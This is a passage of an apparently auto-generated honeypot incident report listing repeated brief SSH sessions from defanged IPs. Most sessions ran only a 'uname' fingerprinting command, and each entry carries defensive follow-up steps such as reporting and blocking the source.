- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7c38dac9e56

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-30 16:43 |
| **Last Seen** | 2026-07-30 16:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:43:59` | `cowrie.session.connect` |
| `2026-07-30 16:43:59` | `cowrie.client.version` |
| `2026-07-30 16:43:59` | `cowrie.client.kex` |
| `2026-07-30 16:44:00` | `cowrie.login.success` |
| `2026-07-30 16:44:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b24fd9bbf146

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-30 16:44 |
| **Last Seen** | 2026-07-30 16:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:44:00` | `cowrie.session.connect` |
| `2026-07-30 16:44:00` | `cowrie.client.version` |
| `2026-07-30 16:44:00` | `cowrie.client.kex` |
| `2026-07-30 16:44:01` | `cowrie.login.success` |
| `2026-07-30 16:44:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07e4668a18bd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:44 |
| **Last Seen** | 2026-07-30 16:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:44:03` | `cowrie.session.connect` |
| `2026-07-30 16:44:03` | `cowrie.client.version` |
| `2026-07-30 16:44:04` | `cowrie.client.kex` |
| `2026-07-30 16:44:04` | `cowrie.login.success` |
| `2026-07-30 16:44:05` | `cowrie.session.params` |
| `2026-07-30 16:44:05` | `cowrie.command.input` |
| `2026-07-30 16:44:05` | `cowrie.log.closed` |
| `2026-07-30 16:44:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32f71fee00bf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:44 |
| **Last Seen** | 2026-07-30 16:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:44:10` | `cowrie.session.connect` |
| `2026-07-30 16:44:10` | `cowrie.client.version` |
| `2026-07-30 16:44:10` | `cowrie.client.kex` |
| `2026-07-30 16:44:10` | `cowrie.login.success` |
| `2026-07-30 16:44:11` | `cowrie.session.params` |
| `2026-07-30 16:44:11` | `cowrie.command.input` |
| `2026-07-30 16:44:12` | `cowrie.log.closed` |
| `2026-07-30 16:44:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7a770f1a8a5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:44 |
| **Last Seen** | 2026-07-30 16:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:44:15` | `cowrie.session.connect` |
| `2026-07-30 16:44:15` | `cowrie.client.version` |
| `2026-07-30 16:44:16` | `cowrie.client.kex` |
| `2026-07-30 16:44:16` | `cowrie.login.success` |
| `2026-07-30 16:44:17` | `cowrie.session.params` |
| `2026-07-30 16:44:17` | `cowrie.command.input` |
| `2026-07-30 16:44:17` | `cowrie.log.closed` |
| `2026-07-30 16:44:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75226ab8e064

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:44 |
| **Last Seen** | 2026-07-30 16:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:44:21` | `cowrie.session.connect` |
| `2026-07-30 16:44:21` | `cowrie.client.version` |
| `2026-07-30 16:44:21` | `cowrie.client.kex` |
| `2026-07-30 16:44:22` | `cowrie.login.success` |
| `2026-07-30 16:44:23` | `cowrie.session.params` |
| `2026-07-30 16:44:23` | `cowrie.command.input` |
| `2026-07-30 16:44:23` | `cowrie.log.closed` |
| `2026-07-30 16:44:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed180ae01a33

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:44 |
| **Last Seen** | 2026-07-30 16:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:44:27` | `cowrie.session.connect` |
| `2026-07-30 16:44:27` | `cowrie.client.version` |
| `2026-07-30 16:44:27` | `cowrie.client.kex` |
| `2026-07-30 16:44:28` | `cowrie.login.success` |
| `2026-07-30 16:44:29` | `cowrie.session.params` |
| `2026-07-30 16:44:29` | `cowrie.command.input` |
| `2026-07-30 16:44:29` | `cowrie.log.closed` |
| `2026-07-30 16:44:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aefcb51f9017

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:44 |
| **Last Seen** | 2026-07-30 16:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:44:33` | `cowrie.session.connect` |
| `2026-07-30 16:44:33` | `cowrie.client.version` |
| `2026-07-30 16:44:33` | `cowrie.client.kex` |
| `2026-07-30 16:44:33` | `cowrie.login.success` |
| `2026-07-30 16:44:34` | `cowrie.session.params` |
| `2026-07-30 16:44:34` | `cowrie.command.input` |
| `2026-07-30 16:44:34` | `cowrie.log.closed` |
| `2026-07-30 16:44:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e70e8fb83b5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:44 |
| **Last Seen** | 2026-07-30 16:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:44:39` | `cowrie.session.connect` |
| `2026-07-30 16:44:39` | `cowrie.client.version` |
| `2026-07-30 16:44:39` | `cowrie.client.kex` |
| `2026-07-30 16:44:39` | `cowrie.login.success` |
| `2026-07-30 16:44:40` | `cowrie.session.params` |
| `2026-07-30 16:44:40` | `cowrie.command.input` |
| `2026-07-30 16:44:40` | `cowrie.log.closed` |
| `2026-07-30 16:44:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-107a1713d4aa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:44 |
| **Last Seen** | 2026-07-30 16:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:44:44` | `cowrie.session.connect` |
| `2026-07-30 16:44:44` | `cowrie.client.version` |
| `2026-07-30 16:44:44` | `cowrie.client.kex` |
| `2026-07-30 16:44:45` | `cowrie.login.success` |
| `2026-07-30 16:44:46` | `cowrie.session.params` |
| `2026-07-30 16:44:46` | `cowrie.command.input` |
| `2026-07-30 16:44:46` | `cowrie.log.closed` |
| `2026-07-30 16:44:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00d9a3836ed5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:44 |
| **Last Seen** | 2026-07-30 16:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:44:50` | `cowrie.session.connect` |
| `2026-07-30 16:44:50` | `cowrie.client.version` |
| `2026-07-30 16:44:50` | `cowrie.client.kex` |
| `2026-07-30 16:44:51` | `cowrie.login.success` |
| `2026-07-30 16:44:52` | `cowrie.session.params` |
| `2026-07-30 16:44:52` | `cowrie.command.input` |
| `2026-07-30 16:44:52` | `cowrie.log.closed` |
| `2026-07-30 16:44:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-096d0084c1f7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:44 |
| **Last Seen** | 2026-07-30 16:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:44:55` | `cowrie.session.connect` |
| `2026-07-30 16:44:55` | `cowrie.client.version` |
| `2026-07-30 16:44:55` | `cowrie.client.kex` |
| `2026-07-30 16:44:56` | `cowrie.login.success` |
| `2026-07-30 16:44:57` | `cowrie.session.params` |
| `2026-07-30 16:44:57` | `cowrie.command.input` |
| `2026-07-30 16:44:57` | `cowrie.log.closed` |
| `2026-07-30 16:44:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-355c4a425cc0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:45 |
| **Last Seen** | 2026-07-30 16:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:45:01` | `cowrie.session.connect` |
| `2026-07-30 16:45:01` | `cowrie.client.version` |
| `2026-07-30 16:45:01` | `cowrie.client.kex` |
| `2026-07-30 16:45:01` | `cowrie.login.success` |
| `2026-07-30 16:45:02` | `cowrie.session.params` |
| `2026-07-30 16:45:02` | `cowrie.command.input` |
| `2026-07-30 16:45:02` | `cowrie.log.closed` |
| `2026-07-30 16:45:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-534b9cc52fea

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:45 |
| **Last Seen** | 2026-07-30 16:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:45:06` | `cowrie.session.connect` |
| `2026-07-30 16:45:06` | `cowrie.client.version` |
| `2026-07-30 16:45:06` | `cowrie.client.kex` |
| `2026-07-30 16:45:07` | `cowrie.login.success` |
| `2026-07-30 16:45:08` | `cowrie.session.params` |
| `2026-07-30 16:45:08` | `cowrie.command.input` |
| `2026-07-30 16:45:08` | `cowrie.log.closed` |
| `2026-07-30 16:45:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87236c3fe799

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:45 |
| **Last Seen** | 2026-07-30 16:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:45:12` | `cowrie.session.connect` |
| `2026-07-30 16:45:12` | `cowrie.client.version` |
| `2026-07-30 16:45:12` | `cowrie.client.kex` |
| `2026-07-30 16:45:12` | `cowrie.login.success` |
| `2026-07-30 16:45:14` | `cowrie.session.params` |
| `2026-07-30 16:45:14` | `cowrie.command.input` |
| `2026-07-30 16:45:14` | `cowrie.log.closed` |
| `2026-07-30 16:45:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a83b9201e90b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:45 |
| **Last Seen** | 2026-07-30 16:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:45:17` | `cowrie.session.connect` |
| `2026-07-30 16:45:17` | `cowrie.client.version` |
| `2026-07-30 16:45:17` | `cowrie.client.kex` |
| `2026-07-30 16:45:18` | `cowrie.login.success` |
| `2026-07-30 16:45:18` | `cowrie.session.params` |
| `2026-07-30 16:45:18` | `cowrie.command.input` |
| `2026-07-30 16:45:18` | `cowrie.log.closed` |
| `2026-07-30 16:45:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a3f328ecd27

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:45 |
| **Last Seen** | 2026-07-30 16:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:45:23` | `cowrie.session.connect` |
| `2026-07-30 16:45:23` | `cowrie.client.version` |
| `2026-07-30 16:45:23` | `cowrie.client.kex` |
| `2026-07-30 16:45:23` | `cowrie.login.success` |
| `2026-07-30 16:45:24` | `cowrie.session.params` |
| `2026-07-30 16:45:24` | `cowrie.command.input` |
| `2026-07-30 16:45:24` | `cowrie.log.closed` |
| `2026-07-30 16:45:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3b2f8ab6fef

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:45 |
| **Last Seen** | 2026-07-30 16:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:45:28` | `cowrie.session.connect` |
| `2026-07-30 16:45:28` | `cowrie.client.version` |
| `2026-07-30 16:45:28` | `cowrie.client.kex` |
| `2026-07-30 16:45:29` | `cowrie.login.success` |
| `2026-07-30 16:45:29` | `cowrie.session.params` |
| `2026-07-30 16:45:29` | `cowrie.command.input` |
| `2026-07-30 16:45:30` | `cowrie.log.closed` |
| `2026-07-30 16:45:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37beac7e43a7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:45 |
| **Last Seen** | 2026-07-30 16:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:45:34` | `cowrie.session.connect` |
| `2026-07-30 16:45:34` | `cowrie.client.version` |
| `2026-07-30 16:45:34` | `cowrie.client.kex` |
| `2026-07-30 16:45:34` | `cowrie.login.success` |
| `2026-07-30 16:45:35` | `cowrie.session.params` |
| `2026-07-30 16:45:35` | `cowrie.command.input` |
| `2026-07-30 16:45:35` | `cowrie.log.closed` |
| `2026-07-30 16:45:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d65819f1174c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:45 |
| **Last Seen** | 2026-07-30 16:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:45:39` | `cowrie.session.connect` |
| `2026-07-30 16:45:39` | `cowrie.client.version` |
| `2026-07-30 16:45:39` | `cowrie.client.kex` |
| `2026-07-30 16:45:40` | `cowrie.login.success` |
| `2026-07-30 16:45:41` | `cowrie.session.params` |
| `2026-07-30 16:45:41` | `cowrie.command.input` |
| `2026-07-30 16:45:41` | `cowrie.log.closed` |
| `2026-07-30 16:45:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1bf2aa5309b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:45 |
| **Last Seen** | 2026-07-30 16:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:45:45` | `cowrie.session.connect` |
| `2026-07-30 16:45:45` | `cowrie.client.version` |
| `2026-07-30 16:45:45` | `cowrie.client.kex` |
| `2026-07-30 16:45:46` | `cowrie.login.success` |
| `2026-07-30 16:45:47` | `cowrie.session.params` |
| `2026-07-30 16:45:47` | `cowrie.command.input` |
| `2026-07-30 16:45:47` | `cowrie.log.closed` |
| `2026-07-30 16:45:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95f7a3e8c9d8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:45 |
| **Last Seen** | 2026-07-30 16:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:45:50` | `cowrie.session.connect` |
| `2026-07-30 16:45:50` | `cowrie.client.version` |
| `2026-07-30 16:45:51` | `cowrie.client.kex` |
| `2026-07-30 16:45:51` | `cowrie.login.success` |
| `2026-07-30 16:45:52` | `cowrie.session.params` |
| `2026-07-30 16:45:52` | `cowrie.command.input` |
| `2026-07-30 16:45:52` | `cowrie.log.closed` |
| `2026-07-30 16:45:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f047530d9342

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:45 |
| **Last Seen** | 2026-07-30 16:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:45:56` | `cowrie.session.connect` |
| `2026-07-30 16:45:56` | `cowrie.client.version` |
| `2026-07-30 16:45:56` | `cowrie.client.kex` |
| `2026-07-30 16:45:57` | `cowrie.login.success` |
| `2026-07-30 16:45:58` | `cowrie.session.params` |
| `2026-07-30 16:45:58` | `cowrie.command.input` |
| `2026-07-30 16:45:58` | `cowrie.log.closed` |
| `2026-07-30 16:45:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb6cd1baf06b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:46 |
| **Last Seen** | 2026-07-30 16:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:46:02` | `cowrie.session.connect` |
| `2026-07-30 16:46:02` | `cowrie.client.version` |
| `2026-07-30 16:46:02` | `cowrie.client.kex` |
| `2026-07-30 16:46:03` | `cowrie.login.success` |
| `2026-07-30 16:46:03` | `cowrie.session.params` |
| `2026-07-30 16:46:03` | `cowrie.command.input` |
| `2026-07-30 16:46:03` | `cowrie.log.closed` |
| `2026-07-30 16:46:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35e709fcdfc7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:46 |
| **Last Seen** | 2026-07-30 16:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:46:08` | `cowrie.session.connect` |
| `2026-07-30 16:46:08` | `cowrie.client.version` |
| `2026-07-30 16:46:08` | `cowrie.client.kex` |
| `2026-07-30 16:46:08` | `cowrie.login.success` |
| `2026-07-30 16:46:09` | `cowrie.session.params` |
| `2026-07-30 16:46:09` | `cowrie.command.input` |
| `2026-07-30 16:46:09` | `cowrie.log.closed` |
| `2026-07-30 16:46:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a493062171d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:46 |
| **Last Seen** | 2026-07-30 16:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:46:13` | `cowrie.session.connect` |
| `2026-07-30 16:46:13` | `cowrie.client.version` |
| `2026-07-30 16:46:13` | `cowrie.client.kex` |
| `2026-07-30 16:46:14` | `cowrie.login.success` |
| `2026-07-30 16:46:15` | `cowrie.session.params` |
| `2026-07-30 16:46:15` | `cowrie.command.input` |
| `2026-07-30 16:46:15` | `cowrie.log.closed` |
| `2026-07-30 16:46:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-433d0d43d514

| Field | Detail |
|---|---|
